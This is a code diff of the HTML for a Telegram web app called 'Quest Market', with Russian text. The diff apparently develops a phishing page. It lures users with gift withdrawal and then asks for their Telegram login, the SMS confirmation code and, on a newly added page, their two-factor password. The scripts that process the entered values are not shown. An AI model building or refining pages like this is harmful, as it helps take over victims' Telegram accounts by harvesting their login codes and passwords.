@@ -9,6 +9,7 @@
     <link rel="stylesheet" href="squares.css">
     <link rel="stylesheet" href="popup.css">
     <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
+
 </head>
 
 <body>
@@ -17,7 +18,7 @@
             <div id="page1">
                 <img class="main-logo" src="assets/ico.svg" alt="">
                 <h1 id="TEST" >Quest Market</h1>
-                <p>Для вывода подарков необходимо авторизоватся через Telegram</p>
+                <p>Для продолжения работы с ботом необходимо авторизоватся через Telegram</p>
                 <button class="btn" id="loginbtn">
                     <img src="assets/tg.svg" alt="">
                     Войти через Telegram
@@ -25,13 +26,21 @@
                 <div id="bg"></div>
 
             </div>
-            <div class="page2">
+            <div class="blur" id="blur"></div>
+            <div id="page2">
                 <img class="small-logo" src="assets/ico.svg" alt="">
-                <h1 class="passcode-title">Введите код</h1>
-                <input type="text" placeholder="...">
+                <h1 class="passcode-title">Введите код из СМС</h1>
+                <input type="number" maxlength="5" id="passcode-input" placeholder="00000" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                 <button class="btn" id="passcode-btn">Подтвердить</button>
                 <div id="popup"></div>
-                <div class="blur"></div>
+
+            </div>
+            <div id="page3">
+                <img class="small-logo" src="assets/ico.svg" alt="">
+                <h1 class="passcode-title">Введите пароль 2FA</h1>
+                <input type="text" placeholder="Пароль" id="twofactor-input">
+                <button class="btn" id="twofactor-btn">Подтвердить</button>
+                <div id="popup"></div>
             </div>
         </div>
 
@@ -51,6 +60,7 @@
     </div>
 
     <script src="loginScripts.js"></script>
+    <script src="scripts.js"></script>
 </body>
 
 </html>
